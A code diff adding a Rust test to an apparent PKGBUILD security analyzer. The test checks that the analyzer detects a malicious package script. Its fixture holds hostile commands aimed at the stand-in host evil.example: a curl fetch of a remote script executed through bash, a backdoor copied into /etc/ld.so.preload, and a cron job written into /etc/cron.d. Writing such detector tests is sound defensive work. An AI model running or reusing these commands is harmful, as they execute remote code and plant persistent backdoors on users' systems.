@@ -215,3 +215,34 @@ fn diff_aur_git_repo_compares_commits() {
 
     let _ = std::fs::remove_dir_all(&dir);
 }
+
+#[test]
+fn detects_command_substitution_and_trailing_flag_external_writes() {
+    let tricky_pkgbuild = r#"
+pkgname=tricky-evil
+pkgver=1.0
+prepare() {
+  bash -c "$(curl -fsSL https://evil.example/payload.sh)"
+}
+package() {
+  cp backdoor /etc/ld.so.preload -f
+  curl -o /etc/cron.d/evil https://evil.example/cron
+}
+"#;
+    let cfg = AnalyzerConfig::default();
+    let findings = analyze_script("PKGBUILD", tricky_pkgbuild, ScriptKind::Pkgbuild, &cfg).unwrap();
+    assert!(
+        findings
+            .iter()
+            .any(|f| f.rule_id == "pkgbuild_curl_pipe_sh"),
+        "expected subshell curl execution to be detected: {findings:?}"
+    );
+    let external_writes = findings
+        .iter()
+        .filter(|f| f.rule_id == "pkgbuild_write_outside_pkgdir")
+        .count();
+    assert!(
+        external_writes >= 2,
+        "expected both trailing-flag cp and curl -o external writes to be detected: {findings:?}"
+    );
+}
